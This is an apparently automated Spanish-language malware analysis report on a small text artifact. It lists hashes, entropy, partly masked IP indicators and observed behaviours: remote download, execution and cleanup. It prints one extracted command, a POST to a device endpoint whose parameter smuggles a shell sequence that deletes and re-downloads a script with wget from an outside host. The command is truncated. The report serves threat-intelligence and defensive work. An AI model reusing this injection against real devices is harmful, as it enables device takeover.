# 🧬 Payload Analysis

`48baa3e56c6fc5f29d035542c4fc082c3a006899c243425edd58cc2b5521e24e`

## 📌 Resumen

Artefacto de 452 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.73. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Ejecución, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 4 indicadores técnicos.


## 🏷️ Clasificación

- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:58:10.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `48baa3e56c6fc5f29d035542c4fc082c3a006899c243425edd58cc2b5521e24e`
- **SHA1:** `b0c705c7975e5062e671e1ee0412ee2447fb2ae3`
- **MD5:** `7b05067ca1671791e3ab485a6bf9f53e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 452 B |
| Entropía | 5.73 |
| Strings | 9 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F85.239
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 143.0.0.XXX | static_analysis |
| ip | 190.179.130.XXX | static_analysis |
| command | POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F85.239 | strings |
| hash | 48baa3e56c6fc5f29d035542c4fc082c3a006899c243425edd58cc2b5521e24e | static_analysis |
| ip | 85.239.151.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
